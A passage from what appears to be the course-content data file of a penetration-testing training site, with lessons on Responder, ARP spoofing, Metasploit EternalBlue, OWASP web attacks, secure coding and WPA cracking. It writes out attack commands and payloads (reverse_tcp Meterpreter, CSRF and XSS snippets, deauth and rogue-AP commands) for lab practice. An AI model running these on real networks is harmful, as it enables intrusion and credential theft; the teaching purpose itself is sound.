                                sudo responder -I eth0
                            </pre>
                
                            <h4 class="font-bold">Practical Activity:</h4>
                            <ul class="list-disc pl-6 mb-4">
                                <li>Use Responder to intercept SMB authentication requests on your local network.</li>
                                <li>Relay the captured credentials to gain unauthorized access to another system.</li>
                                <li>Document the attack and the results.</li>
                            </ul>
                
                            <h4 class="font-bold">2. Man-in-the-Middle (MITM) Attacks</h4>
                            <p>In a MITM attack, the attacker intercepts communications between two parties (e.g., a client and server), allowing them to capture sensitive information such as login credentials, manipulate traffic, or inject malicious content.</p>
                
                            <h4 class="font-bold">Common MITM Techniques:</h4>
                            <ul class="list-disc pl-6 mb-4">
                                <li><strong>ARP Spoofing:</strong> Tricking devices on a local network into sending traffic through the attacker’s machine by forging ARP responses.</li>
                                <li><strong>DNS Spoofing:</strong> Manipulating DNS responses to redirect victims to malicious websites.</li>
                            </ul>
                
                            <h4 class="font-bold">Tools:</h4>
                            <ul class="list-disc pl-6 mb-4">
                                <li><strong>Ettercap:</strong> A popular tool for performing MITM attacks by ARP spoofing.</li>
                            </ul>
                            <pre>
                                sudo ettercap -T -M arp:remote /192.168.1.10// /192.168.1.1//
                            </pre>
                
                            <h4 class="font-bold">Practical Activity:</h4>
                            <ul class="list-disc pl-6 mb-4">
                                <li>Use Ettercap to perform an ARP spoofing attack on a local network.</li>
                                <li>Intercept traffic between the victim and the network gateway.</li>
                                <li>Document the captured data and any sensitive information that was intercepted.</li>
                            </ul>
                        `},
                        {
                            title: 'Part: 4 Introduction to Exploitation Frameworks: Metasploit',
                            content: `
                                <h4 class="font-bold">Metasploit Overview</h4>
                                <p>Metasploit is one of the most powerful and widely used exploitation frameworks. It provides a large database of exploits, payloads, and tools for penetration testers to automate the process of exploiting vulnerabilities.</p>
                                
                                <h4 class="font-bold">Key Features of Metasploit:</h4>
                                <ul class="list-disc pl-6 mb-4">
                                    <li><strong>Exploit Modules:</strong> Pre-built code for exploiting known vulnerabilities.</li>
                                    <li><strong>Payloads:</strong> Malicious code that is executed on the target system after exploitation (e.g., reverse shells, Meterpreter).</li>
                                    <li><strong>Post-Exploitation Tools:</strong> Once a system is compromised, Metasploit can help escalate privileges, maintain persistence, or pivot to other systems in the network.</li>
                                </ul>
                    
                                <h4 class="font-bold">Basic Metasploit Workflow:</h4>
                                <ol class="list-decimal pl-6 mb-4">
                                    <li><strong>Select an Exploit:</strong> Find and choose an exploit module for the target system.
                                        <pre>use exploit/windows/smb/ms17_010_eternalblue</pre>
                                    </li>
                                    <li><strong>Set the Payload:</strong> Define the malicious code to run on the target system.
                                        <pre>set payload windows/x64/meterpreter/reverse_tcp</pre>
                                    </li>
                                    <li><strong>Set Target Parameters:</strong> Define the target IP address and other details.
                                        <pre>set RHOST 192.168.1.100</pre>
                                    </li>
                                    <li><strong>Launch the Exploit:</strong> Execute the exploit to gain access.
                                        <pre>exploit</pre>
                                    </li>
                                </ol>
                    
                                <h4 class="font-bold">Practical Activity:</h4>
                                <ul class="list-disc pl-6 mb-4">
                                    <li>Set up a vulnerable virtual machine (e.g., Metasploitable2).</li>
                                    <li>Use Metasploit to exploit a known vulnerability, such as MS17-010 (EternalBlue).</li>
                                    <li>Document the exploitation process and the access gained to the target system.</li>
                                </ul>
                    
                                <h4 class="font-bold">Assignment for Week 2:</h4>
                                <ul class="list-disc pl-6 mb-4">
                                    <li><strong>Lab Report:</strong> Perform an SQL injection attack on a vulnerable web application using sqlmap. Capture the output and provide a detailed description of the attack process and the data retrieved.</li>
                                    <li><strong>Metasploit Lab:</strong> Use Metasploit to exploit a vulnerability on Metasploitable2 or another vulnerable machine. Write a step-by-step report explaining how the exploit worked and the result of the attack.</li>
                                </ul>
                    
                                <h4 class="font-bold">Additional Reading:</h4>
                                <ul class="list-disc pl-6 mb-4">
                                    <li><strong>Book:</strong> "Metasploit: The Penetration Tester’s Guide" by David Kennedy — A comprehensive guide to using Metasploit for exploitation.</li>
                                    <li><strong>Blog:</strong> "Exploit-DB" (https://www.exploit-db.com/) — Stay updated on the latest exploits and vulnerabilities in widely used software.</li>
                                    <li><strong>Video Tutorial:</strong> "Metasploit Unleashed" by Offensive Security — A free resource for learning how to use Metasploit effectively.</li>
                                </ul>
                    
                                <h4 class="font-bold">Next Week Preview:</h4>
                                <p>Next week, we will focus on Post-Exploitation Techniques, where you’ll learn how to maintain access to a compromised system, escalate privileges, and exfiltrate data without being detected.</p>
                            `}
                ],
                videoUrl: 'https://example.com/vulnerability-analysis-video',
                commands: ['nikto -h <target-IP>', 'zap.sh', 'burpsuite'],
                content: ''
                },
                {
                id: "module-5",
                title: 'Module 5 - Web Application Security ',
                icon: Shield,
                sections: [
                    {
                        title: 'Week 1: Web Application Vulnerabilities',
                        content: `
                            <h4 class="font-bold">Part: 1 Overview</h4>
                            <p>This module focuses on the security of web applications, a critical area given the widespread use of the web for both business and personal activities. Web applications are frequent targets for attackers because of the sensitive data they process and store. We’ll cover the OWASP Top 10, which highlights the most critical web application vulnerabilities, and dive into practical examples and techniques to exploit vulnerabilities such as SQL Injection, XSS, CSRF, and Insecure Deserialization. We’ll also perform hands-on labs using Burp Suite, a powerful web security testing tool.</p>
                
                            <h4 class="font-bold">Topics Covered:</h4>
                            <ul class="list-disc pl-6 mb-4">
                                <li>Overview of OWASP Top 10.</li>
                                <li>Analysis of SQL Injection, Cross-Site Scripting (XSS), Cross-Site Request Forgery (CSRF), and Insecure Deserialization.</li>
                                <li>Hands-on Labs: Exploiting web vulnerabilities with Burp Suite.</li>
                            </ul>
                
                            <h4 class="font-bold">Overview of OWASP Top 10</h4>
                            <p>The OWASP Top 10 is a widely recognized list of the most critical security risks to web applications. Each item on the list represents a category of vulnerabilities, rather than a specific flaw. These vulnerabilities are commonly exploited by attackers to compromise web applications, steal data, or manipulate systems.</p>
                
                            <h4 class="font-bold">OWASP Top 10 (2021):</h4>
                            <ol class="list-decimal pl-6 mb-4">
                                <li><strong>Broken Access Control:</strong> Improper enforcement of access rights, allowing unauthorized users to access or modify resources.</li>
                                <li><strong>Cryptographic Failures:</strong> Weak encryption or failure to protect sensitive data in transit or storage.</li>
                                <li><strong>Injection Attacks:</strong> User input is executed as part of a command or query (e.g., SQL, NoSQL, OS, or LDAP injection).</li>
                                <li><strong>Insecure Design:</strong> Flaws in the design phase that make an application inherently insecure.</li>
                                <li><strong>Security Misconfiguration:</strong> Default configurations, incomplete setups, or failure to implement security measures properly.</li>
                                <li><strong>Vulnerable and Outdated Components:</strong> Use of old libraries, frameworks, or components with known vulnerabilities.</li>
                                <li><strong>Identification and Authentication Failures:</strong> Insecure authentication mechanisms that lead to unauthorized access.</li>
                                <li><strong>Software and Data Integrity Failures:</strong> Lack of mechanisms to detect integrity violations in software or data (e.g., CI/CD pipeline issues).</li>
                                <li><strong>Security Logging and Monitoring Failures:</strong> Inadequate logging and monitoring, preventing detection and response to attacks.</li>
                                <li><strong>Server-Side Request Forgery (SSRF):</strong> External requests are made based on user-controlled input, allowing access to internal systems.</li>
                            </ol>
                
                            <h4 class="font-bold">Practical Activity:</h4>
                            <ul class="list-disc pl-6 mb-4">
                                <li><strong>OWASP Top 10 Review:</strong></li>
                                <ol class="list-decimal pl-6 mb-4">
                                    <li>Visit the OWASP Top 10 website and review each category.</li>
                                    <li>For each category, find a real-world case study where that vulnerability was exploited.</li>
                                </ol>
                            </ul>
                        `},
        {
            title: 'Part:2 Analysis of Web Application Vulnerabilities',
            content: `
                <h4 class="font-bold">1. SQL Injection (SQLi)</h4>
                <p>SQL Injection is a technique where an attacker manipulates user input to inject malicious SQL queries into the application's database. If successful, this can lead to data theft, unauthorized access, and potentially full system compromise.</p>

                <h5 class="font-bold">Example of an SQL Injection Attack:</h5>
                <pre><code>SELECT * FROM users WHERE username = 'admin' --' AND password = 'password';</code></pre>
                <p>By injecting '--', the password check is bypassed because everything after '--' is treated as a comment.</p>

                <h5 class="font-bold">Impact:</h5>
                <ul class="list-disc pl-6 mb-4">
                    <li><strong>Data Extraction:</strong> Attackers can retrieve sensitive data such as user credentials.</li>
                    <li><strong>Authentication Bypass:</strong> Bypass login mechanisms.</li>
                    <li><strong>Data Manipulation:</strong> Modify, delete, or insert new data in the database.</li>
                </ul>

                <h5 class="font-bold">Practical Activity:</h5>
                <ul class="list-disc pl-6 mb-4">
                    <li><strong>SQL Injection Exploitation:</strong></li>
                    <ol class="list-decimal pl-6 mb-4">
                        <li>Use Burp Suite to identify an SQL injection vulnerability on a demo web application (e.g., DVWA or bWAPP).</li>
                        <li>Use sqlmap to automate the exploitation process and extract sensitive data.</li>
                    </ol>
                </ul>

                <h4 class="font-bold">2. Cross-Site Scripting (XSS)</h4>
                <p>Cross-Site Scripting (XSS) occurs when an attacker injects malicious scripts into a website, which are then executed by other users. XSS can be used to steal session cookies, perform unauthorized actions on behalf of users, or display malicious content.</p>

                <h5 class="font-bold">Types of XSS:</h5>
                <ul class="list-disc pl-6 mb-4">
                    <li><strong>Stored XSS:</strong> Malicious script is stored on the server and executed whenever a user accesses the page.</li>
                    <li><strong>Reflected XSS:</strong> The script is reflected back to the user in the HTTP response (e.g., through a search query).</li>
                    <li><strong>DOM-based XSS:</strong> The vulnerability exists within the client-side JavaScript code itself.</li>
                </ul>

                <h5 class="font-bold">Example of XSS Attack:</h5>
                <pre><code>&lt;script&gt;alert('XSS');&lt;/script&gt;</code></pre>

                <h5 class="font-bold">Impact:</h5>
                <ul class="list-disc pl-6 mb-4">
                    <li><strong>Session Hijacking:</strong> Steal users' session cookies and impersonate their accounts.</li>
                    <li><strong>Defacement:</strong> Modify the appearance of the website to display malicious content.</li>
                    <li><strong>Keylogging:</strong> Capture sensitive user inputs (e.g., passwords).</li>
                </ul>

                <h5 class="font-bold">Practical Activity:</h5>
                <ul class="list-disc pl-6 mb-4">
                    <li><strong>XSS Exploitation:</strong></li>
                    <ol class="list-decimal pl-6 mb-4">
                        <li>Identify an XSS vulnerability in a demo web application (like bWAPP).</li>
                        <li>Inject a script to steal session cookies and document the process.</li>
                    </ol>
                </ul>
            `},
        {
            title: 'Part: 3 Cross-Site Request Forgery (CSRF) and Insecure Deserialization',
            content: `
                <h4 class="font-bold">3. Cross-Site Request Forgery (CSRF)</h4>
                <p>CSRF tricks users into executing unwanted actions on a web application where they are already authenticated. Attackers exploit the trust a web application has in a user's browser by forging requests that perform actions like changing passwords or transferring money.</p>

                <h5 class="font-bold">Example of CSRF Attack:</h5>
                <pre><code>&lt;img src="http://bank.com/change-password?newpassword=hacked" /&gt;</code></pre>

                <h5 class="font-bold">Impact:</h5>
                <ul class="list-disc pl-6 mb-4">
                    <li><strong>Unauthorized Actions:</strong> Attacker forces the user to perform actions without their consent.</li>
                    <li><strong>Account Takeover:</strong> Changing critical account settings like passwords or emails.</li>
                </ul>

                <h5 class="font-bold">Practical Activity:</h5>
                <ul class="list-disc pl-6 mb-4">
                    <li><strong>CSRF Exploitation:</strong></li>
                    <ol class="list-decimal pl-6 mb-4">
                        <li>Use Burp Suite to create a proof-of-concept (PoC) CSRF attack on a vulnerable application (e.g., bWAPP).</li>
                        <li>Test if you can successfully modify account details or settings.</li>
                    </ol>
                </ul>

                <h4 class="font-bold">4. Insecure Deserialization</h4>
                <p>Insecure deserialization occurs when data from an untrusted source is deserialized without proper validation. This allows attackers to inject malicious objects that can lead to remote code execution or data tampering.</p>

                <h5 class="font-bold">Example of Insecure Deserialization:</h5>
                <p>Sending a serialized object to the server that, when deserialized, executes malicious code.</p>

                <h5 class="font-bold">Impact:</h5>
                <ul class="list-disc pl-6 mb-4">
                    <li><strong>Remote Code Execution:</strong> Execute arbitrary code on the server.</li>
                    <li><strong>Privilege Escalation:</strong> Elevate privileges by tampering with deserialized objects.</li>
                </ul>

                <h5 class="font-bold">Practical Activity:</h5>
                <ul class="list-disc pl-6 mb-4">
                    <li><strong>Insecure Deserialization Exploitation:</strong></li>
                    <ol class="list-decimal pl-6 mb-4">
                        <li>Identify an insecure deserialization vulnerability in a vulnerable web app (like Java Unserialization labs).</li>
                        <li>Exploit the vulnerability to gain unauthorized access or execute code.</li>
                    </ol>
                </ul>

                <h4 class="font-bold">Hands-on Labs: Exploiting Web Vulnerabilities with Burp Suite</h4>
                <p>Burp Suite is a powerful tool used by penetration testers to find and exploit web application vulnerabilities. It includes features like proxy, intruder, repeater, and scanner to identify and manipulate web traffic.</p>

                <h5 class="font-bold">Burp Suite Lab Setup:</h5>
                <ul class="list-disc pl-6 mb-4">
                    <li>Install Burp Suite (Community or Pro version) on your system.</li>
                    <li>Set up a local vulnerable web application like DVWA or bWAPP to practice exploiting SQLi, XSS, CSRF, and other vulnerabilities.</li>
                    <li>Configure your browser to proxy traffic through Burp Suite.</li>
                </ul>

                <h5 class="font-bold">Practical Lab Activities:</h5>
                <ul class="list-disc pl-6 mb-4">
                    <li><strong>Intercept and Manipulate Requests:</strong> Use the Proxy feature in Burp Suite to capture and modify HTTP requests and responses.</li>
                    <li><strong>SQL Injection Test:</strong> Manually test for SQL injection vulnerabilities by modifying parameters in HTTP requests.</li>
                    <li><strong>Automated Vulnerability Scanning:</strong> Use Burp Suite’s Scanner feature to automatically detect vulnerabilities in a web application.</li>
                    <li><strong>XSS and CSRF Exploitation:</strong> Use Repeater to craft custom payloads for XSS and CSRF attacks.</li>
                </ul>
            `},
        {
            title: 'Week 2: Secure Coding Practices',
            content: `
                <h4 class="font-bold">Part:1 Secure Coding Practices</h4>
                <p class=" mb-4">In Week 10, we’ll cover Secure Coding Practices, focusing on how to build secure web applications that can prevent the vulnerabilities we’ve exploited in Week 9. We’ll explore the Secure Software Development Life Cycle (SDLC) and key techniques for secure input handling, authentication, and session management.</p>

                <h5 class="font-bold">Topics Covered:</h5>
                <ul class="list-disc pl-6 mb-4">
                    <li>Secure Software Development Life Cycle (SDLC).</li>
                    <li>Input validation, output encoding, secure authentication, and session management.</li>
                    <li>Case studies of real-world web application attacks and defenses.</li>
                </ul>

                <h4 class="font-bold">Secure Software Development Life Cycle (SDLC)</h4>
                <p class=" mb-4">The Secure SDLC integrates security at every phase of the software development lifecycle, from planning and design to deployment and maintenance. This approach helps identify and mitigate security vulnerabilities early, reducing risks and improving the security posture of the application.</p>

                <h5 class="font-bold">Key Phases of the Secure SDLC:</h5>
                <ol class="list-decimal pl-6 mb-4">
                    <li><strong>Requirements Gathering:</strong> Define security requirements alongside functional requirements.</li>
                    <li><strong>Design and Architecture:</strong> Incorporate security patterns such as least privilege, defense in depth, and secure defaults.</li>
                    <li><strong>Implementation:</strong> Follow secure coding practices to minimize vulnerabilities.</li>
                    <li><strong>Testing:</strong> Perform security testing such as code reviews, penetration testing, and static/dynamic analysis.</li>
                    <li><strong>Deployment:</strong> Ensure the secure deployment of the application with proper configurations.</li>
                    <li><strong>Maintenance:</strong> Continuously monitor, patch, and update the application to address new vulnerabilities.</li>
                </ol>

                <h4 class="font-bold">Input Validation, Output Encoding, Secure Authentication, and Session Management</h4>

                <h5 class="font-bold">1. Input Validation</h5>
                <p class=" mb-4">Input validation is the process of ensuring that user inputs are safe and expected. This helps prevent injection attacks, buffer overflows, and other forms of input-related vulnerabilities.</p>

                <h5 class="font-bold">Best Practices:</h5>
                <ul class="list-disc pl-6 mb-4">
                    <li><strong>Whitelist Validation:</strong> Only allow input that matches a predefined set of safe values.</li>
                    <li><strong>Length Checks:</strong> Limit the length of input fields to prevent buffer overflows.</li>
                    <li><strong>Data Type Validation:</strong> Ensure that input matches the expected data type (e.g., numbers, strings, etc.).</li>
                </ul>

                <h5 class="font-bold">2. Output Encoding</h5>
                <p class=" mb-4">Output encoding ensures that data is safely rendered to users, preventing issues like XSS by encoding special characters that might be executed as code.</p>

                <h5 class="font-bold">Best Practices:</h5>
                <ul class="list-disc pl-6 mb-4">
                    <li><strong>Use proper encoding libraries:</strong> (e.g., OWASP ESAPI) to encode special characters.</li>
                    <li><strong>HTML, URL, and JavaScript Encoding:</strong> Different encoding techniques should be applied based on the context (e.g., HTML, URL, JavaScript).</li>
                </ul>
            `},
        {
            title: 'Part:2 Secure Authentication and Session Management',
            content: `
                <h4 class="font-bold">3. Secure Authentication</h4>
                <p class=" mb-4">Authentication mechanisms must ensure that only authorized users can access the system. Weak authentication mechanisms can lead to brute force attacks, credential stuffing, or account takeovers.</p>

                <h5 class="font-bold">Best Practices:</h5>
                <ul class="list-disc pl-6 mb-4">
                    <li><strong>Multi-Factor Authentication (MFA):</strong> Require users to authenticate using more than one factor (e.g., password + token).</li>
                    <li><strong>Strong Password Policies:</strong> Enforce complex password requirements and rate-limiting for login attempts.</li>
                    <li><strong>Secure Session Management:</strong> Use secure cookies and session tokens to prevent session hijacking.</li>
                </ul>

                <h4 class="font-bold">4. Session Management</h4>
                <p class=" mb-4">Session management is critical to ensure that user sessions are protected and cannot be hijacked or reused.</p>

                <h5 class="font-bold">Best Practices:</h5>
                <ul class="list-disc pl-6 mb-4">
                    <li><strong>Use Secure Cookies:</strong> Set the Secure and HttpOnly flags to prevent session cookies from being accessed via JavaScript or sent over non-HTTPS connections.</li>
                    <li><strong>Session Expiry:</strong> Automatically expire sessions after a certain period of inactivity.</li>
                    <li><strong>Token Revocation:</strong> Ensure that session tokens are invalidated after logout or a period of inactivity.</li>
                </ul>

                <h4 class="font-bold">Case Studies of Real-World Web Application Attacks and Defenses</h4>
                <p><strong>1. Equifax Data Breach (2017):</strong></p>
                <ul class="list-disc pl-6 mb-4">
                    <li><strong>Vulnerability:</strong> A Struts2 vulnerability (CVE-2017-5638) was exploited using an insecure deserialization attack.</li>
                    <li><strong>Lesson:</strong> Keeping software updated and performing regular vulnerability assessments could have prevented this breach.</li>
                </ul>
                <p><strong>2. LinkedIn Password Leak (2012):</strong></p>
                <ul class="list-disc pl-6 mb-4">
                    <li><strong>Vulnerability:</strong> Weak password hashing led to the compromise of millions of user passwords.</li>
                    <li><strong>Lesson:</strong> Always use strong hashing algorithms (e.g., bcrypt, Argon2) to securely store passwords.</li>
                </ul>
                    `},
            {
                title: '(cont) Part:2 Secure Authentication and Session Management',
                content:`
                <h4 class="font-bold mb-4">Practical Activity:</h4>
                <p class=" mb-4"><strong>Real-World Attack Analysis:</strong> Research a high-profile web application attack (e.g., Yahoo Data Breach, Capital One). Analyze how the attack was performed, what vulnerability was exploited, and what mitigation strategies could have prevented the breach.</p>

                <h4 class="font-bold mb-4">Assignment for Week 9 and Week 10:</h4>
                <p class=" mb-4"><strong>Week 9:</strong> Perform SQL injection and XSS attacks on a vulnerable web application using Burp Suite and sqlmap. Write a report detailing each attack and its consequences.</p>
                <p class=" mb-4"><strong>Week 10:</strong> Review the security of an existing web application you’ve built or have access to. Identify potential vulnerabilities in input validation, authentication, and session management. Propose remediation strategies and write a report.</p>

                <h4 class="font-bold">Additional Reading:</h4>
                <ul class="list-disc pl-6 mb-4">
                    <li><strong>Book:</strong> "The Web Application Hacker’s Handbook" by Dafydd Stuttard and Marcus Pinto — A comprehensive guide to web application security testing.</li>
                    <li><strong>OWASP Secure Coding Practices Guide:</strong> <a href="https://owasp.org/www-project-secure-codingpractices/" target="_blank">https://owasp.org/www-project-secure-codingpractices/</a> — A guide to secure coding techniques to avoid common vulnerabilities.</li>
                </ul>

                <h4 class="font-bold">Next Week Preview:</h4>
                <p>Next week, we will dive into Advanced Exploitation Techniques, where we will explore sophisticated attack methods such as server-side request forgery (SSRF), insecure deserialization, and more complex exploitation of authentication mechanisms like JWT and OAuth.</p>`
            }
                ],
                videoUrl: 'https://example.com/owasp-top-10-web-vulnerabilities-video',
                commands: [],
                content: ''
                },
                {
                id: "module-8",
                title: 'Module 6 - Wireless and Mobile Security ',
                icon: Shield,
                sections: [
                        {
                            title: 'Week 1: Wireless Network Security',
                            content: `
                                <h4 class="font-bold">Part 1: Wireless Network Security</h4>
                                <p class="pl-6 mb-4">This module focuses on the security challenges of wireless networks, which have become a major target for attackers due to their widespread use in both public and private environments. We will analyze the key security protocols (WEP, WPA, WPA2, and WPA3) used in wireless networks, explore techniques to crack these protocols, and study rogue access point (AP) attacks. Additionally, hands-on labs will involve using tools like Aircrack-ng and Kismet to perform wireless penetration testing and evaluate the security of wireless networks.</p>
                    
                                <h4 class="font-bold">Topics Covered:</h4>
                                <ul class="list-disc pl-6 mb-4">
                                    <li>Detailed analysis of wireless security protocols.</li>
                                    <li>Cracking WPA/WPA2/WPA3 and rogue access point attacks.</li>
                                    <li>Hands-on labs: Wireless penetration testing with Aircrack-ng and Kismet.</li>
                                </ul>
                    
                                <h4 class="font-bold">1. Detailed Analysis of Wireless Security Protocols</h4>
                                <p class="pl-6 mb-4">Wireless networks use various encryption protocols to protect communications between devices and access points. Understanding these protocols, their strengths, and their weaknesses is key to securing wireless networks and identifying potential vulnerabilities.</p>
                    
                                <h4 class="font-bold">1. WEP (Wired Equivalent Privacy)</h4>
                                <p class="pl-6 mb-4">WEP was the first encryption standard used for wireless networks, designed to provide confidentiality comparable to a wired network. However, due to serious flaws in its cryptographic implementation, WEP is no longer considered secure and can be easily cracked.</p>
                                <p class="pl-6 mb-4"><strong>Key Weaknesses:</strong></p>
                                <ul class="list-disc pl-6 mb-4">
                                    <li>Short Initialization Vectors (IVs): The 24-bit IV in WEP is short, leading to IV reuse, which makes it vulnerable to statistical attacks.</li>
                                    <li>RC4 Algorithm Flaws: Weaknesses in the RC4 stream cipher make it susceptible to keystream attacks.</li>
                                </ul>
                                <p class="pl-6 mb-4"><strong>Cracking WEP:</strong></p>
                                <ul class="list-disc pl-6 mb-4">
                                    <li>Aircrack-ng can be used to capture enough weak IVs from WEP-encrypted traffic and crack the WEP key in minutes.</li>
                                </ul>
                    
                                <h4 class="font-bold">2. WPA (Wi-Fi Protected Access)</h4>
                                <p class="pl-6 mb-4">WPA was introduced to address WEP's vulnerabilities by implementing stronger encryption and key management. It uses TKIP (Temporal Key Integrity Protocol) to dynamically change keys and mitigate key reuse.</p>
                                <p class="pl-6 mb-4"><strong>Key Weaknesses:</strong></p>
                                <ul class="list-disc pl-6 mb-4">
                                    <li>TKIP Vulnerabilities: WPA's reliance on TKIP makes it susceptible to certain attacks, such as Beck-Tews and Michael Message Integrity Code attacks.</li>
                                </ul>
                                <p class="pl-6 mb-4"><strong>Cracking WPA:</strong></p>
                                <ul class="list-disc pl-6 mb-4">
                                    <li>Attacks on WPA often rely on brute-force or dictionary attacks against weak Pre-Shared Keys (PSK) after capturing the 4-way handshake using tools like Aircrack-ng.</li>
                                </ul>
                            `},
                    {
                        title: 'Part: 2 Wireless Network Security - WPA2 & WPA3',
                        content: `
                            <h4 class="font-bold">3. WPA2 (Wi-Fi Protected Access 2)</h4>
                            <p class="pl-6 mb-4">WPA2 is the most commonly used encryption protocol today, employing AES (Advanced Encryption Standard) with the CCMP (Counter Mode with Cipher Block Chaining Message Authentication Code Protocol), which is much stronger than TKIP.</p>
                            <p class="pl-6 mb-4"><strong>Key Weaknesses:</strong></p>
                            <ul class="list-disc pl-6 mb-4">
                                <li>Weak Passphrase Attacks: WPA2 remains vulnerable to brute-force attacks if weak passphrases are used.</li>
                                <li>KRACK (Key Reinstallation Attack): Exploits a vulnerability in the WPA2 4-way handshake, allowing attackers to decrypt data and inject malicious packets.</li>
                            </ul>
                            <p class="pl-6 mb-4"><strong>Cracking WPA2:</strong></p>
                            <ul class="list-disc pl-6 mb-4">
                                <li>WPA2-PSK can still be cracked using dictionary or brute-force attacks if a weak passphrase is used. Tools like Hashcat and Aircrack-ng can be used to crack WPA2 passwords by capturing the handshake.</li>
                            </ul>

                            <h4 class="font-bold">4. WPA3 (Wi-Fi Protected Access 3)</h4>
                            <p class="pl-6 mb-4">WPA3 is the latest wireless encryption standard and addresses many of the weaknesses in WPA2. It introduces Simultaneous Authentication of Equals (SAE), a key exchange protocol that protects against brute-force attacks.</p>
                            <p class="pl-6 mb-4"><strong>Key Features:</strong></p>
                            <ul class="list-disc pl-6 mb-4">
                                <li>Enhanced Protection for Weak Passwords: WPA3 uses SAE, which resists offline dictionary attacks.</li>
                                <li>Forward Secrecy: WPA3 provides forward secrecy, ensuring that even if a session key is compromised, it cannot be used to decrypt past communications.</li>
                            </ul>
                            <p class="pl-6 mb-4"><strong>Weaknesses:</strong></p>
                            <ul class="list-disc pl-6 mb-4">
                                <li>Dragonblood Attack: Researchers have identified vulnerabilities in the SAE handshake that allow for side-channel attacks on WPA3 networks, although these attacks are more difficult than those on WPA2.</li>
                            </ul>

                            <h4 class="font-bold">Practical Activity:</h4>
                            <p class="pl-6 mb-4"><strong>WPA3 Analysis:</strong></p>
                            <ul class="list-disc pl-6 mb-4">
                                <li>Set up a WPA3 network using a modern router.</li>
                                <li>Test the security of the network by attempting to perform attacks like dictionary attacks, even though they are much harder to execute successfully against WPA3.</li>
                            </ul>
                        `},
            {
            title: 'Part: 3. Cracking WPA/WPA2/WPA3 and Rogue Access Point Attacks',
            content: `
            <h4 class="font-bold">2. Cracking WPA/WPA2/WPA3 and Rogue Access Point Attacks</h4>
            <h5 class="font-bold pl-6 mb-4">1. Cracking WPA/WPA2 Networks</h5>
            <p class="pl-6 mb-4">Wireless network cracking typically involves capturing the handshake between a client and the access point and then using a brute-force or dictionary attack to crack the passphrase.</p>
            <p class="pl-6 mb-4"><strong>Steps to Crack WPA/WPA2:</strong></p>
            <ol class="list-decimal pl-6 mb-4">
                <li><strong>Capture the 4-Way Handshake:</strong> Use airmon-ng and airodump-ng to capture the handshake between the client and the AP when a device connects to the network.</li>
                <p class="pl-6 mb-4">Command to start monitoring mode: <code>airmon-ng start wlan0</code></p>
                <p class="pl-6 mb-4">Command to capture handshake: <code>airodump-ng --bssid &lt;AP_BSSID&gt; --channel &lt;CH&gt; -w capture wlan0</code></p>
                <li><strong>Deauthenticate a Client:</strong> Use aireplay-ng to deauthenticate a connected client, forcing it to reconnect and generate a new handshake.</li>
                <p class="pl-6 mb-4">Command to deauthenticate: <code>aireplay-ng --deauth 10 -a &lt;AP_BSSID&gt; -c &lt;Client_MAC&gt; wlan0</code></p>
                <li><strong>Crack the WPA/WPA2 Key:</strong> Use Aircrack-ng or Hashcat to crack the handshake using a dictionary or brute-force attack.</li>
                <p class="pl-6 mb-4">Command to crack the handshake: <code>aircrack-ng -w /path/to/wordlist capture-01.cap</code></p>
            </ol>

            <h5 class="font-bold pl-6 mb-4">Practical Activity:</h5>
            <ul class="list-disc pl-6 mb-4">
                <li><strong>WPA2 Cracking:</strong></li>
                <ul class="list-disc pl-6 mb-4">
                    <li>Set up a WPA2-secured wireless network.</li>
                    <li>Use Aircrack-ng to capture the handshake and crack the WPA2 key using a dictionary attack.</li>
                    <li>Document how the attack is carried out and how long it takes based on the strength of the password.</li>
                </ul>
            </ul>


            `},
            {
            title: '',
            content:`
            <h5 class="font-bold pl-6 mb-4">2. Rogue Access Point Attacks</h5>
            <p class="pl-6 mb-4">A Rogue Access Point (Rogue AP) is a malicious wireless access point set up by an attacker to trick users into connecting. Once users connect to the rogue AP, their traffic can be intercepted, and attackers can steal credentials, monitor communications, or inject malicious payloads.</p>
            <p class="pl-6 mb-4"><strong>Techniques:</strong></p>
            <ul class="list-disc pl-6 mb-4">
                <li><strong>Evil Twin Attack:</strong> The attacker sets up a rogue AP that mimics a legitimate network (same SSID). Users unknowingly connect to the rogue AP, and the attacker can monitor their traffic.</li>
                <li><strong>Karma Attack:</strong> The attacker’s rogue AP responds to any probe requests from nearby devices, forcing them to automatically connect.</li>
            </ul>

            <p class="pl-6 mb-4"><strong>Tools for Rogue AP Attacks:</strong></p>
            <ul class="list-disc pl-6 mb-4">
                <li><strong>Airbase-ng:</strong> A tool in the Aircrack-ng suite that allows you to create a rogue AP.</li>
                <p class="pl-6 mb-4">Command to create a rogue AP: <code>airbase-ng -e "Free_WiFi" -c 6 wlan0</code></p>
                <li><strong>Hostapd:</strong> A tool for setting up rogue APs, allowing more advanced configurations.</li>
                <p class="pl-6 mb-4">Command to set up a rogue AP: <code>hostapd rogue_ap.conf</code></p>
            </ul>

            <h5 class="font-bold pl-6 mb-4">Practical Activity:</h5>
            <ul class="list-disc pl-6 mb-4">
                <li><strong>Set Up a Rogue AP:</strong></li>
                <ul class="list-disc pl-6 mb-4">
                    <li>Use Airbase-ng to create a rogue access point that mimics a legitimate wireless network.</li>
                    <li>Capture the traffic from devices that connect to the rogue AP and analyze the captured data using Wireshark.</li>
                </ul>
            </ul>`
            },
            {
            title: 'Part:4. Hands-On Labs: Wireless Penetration Testing with Aircrack-ng and Kismet',
            content: `
                <h4 class="font-bold">3. Hands-On Labs: Wireless Penetration Testing with Aircrack-ng and Kismet</h4>
                
                <h5 class="font-bold pl-6 mb-4">Lab 1: Wireless Reconnaissance with Kismet</h5>
                <p class="pl-6 mb-4">Kismet is a wireless network detector, sniffer, and intrusion detection system. It passively listens to wireless traffic and collects information about available networks and devices, such as SSIDs, signal strength, encryption types, and connected clients.</p>
                
                <p class="pl-6 mb-4"><strong>Steps:</strong></p>
                <ol class="list-decimal pl-6 mb-4">
                    <li><strong>Install Kismet:</strong></li>
                    <p class="pl-6 mb-4">On Kali Linux:</p>
                    <pre class="pl-6 mb-4"><code>sudo apt install kismet</code></pre>
                    
                    <li><strong>Run Kismet:</strong></li>
                    <p class="pl-6 mb-4">Start Kismet and configure your wireless interface in monitoring mode.</p>
                    <pre class="pl-6 mb-4"><code>kismet -c wlan0</code></pre>
                    
                    <li><strong>Capture Network Information:</strong></li>
                    <p class="pl-6 mb-4">Use Kismet to passively detect nearby wireless networks, identify SSIDs, encryption methods, and associated clients.</p>
                    
                    <li><strong>Analyze Captured Traffic:</strong></li>
                    <p class="pl-6 mb-4">Review the captured network data to assess the security of detected networks and their associated devices.</p>
                </ol>
                
                <h5 class="font-bold pl-6 mb-4">Practical Activity:</h5>
                <ul class="list-disc pl-6 mb-4">
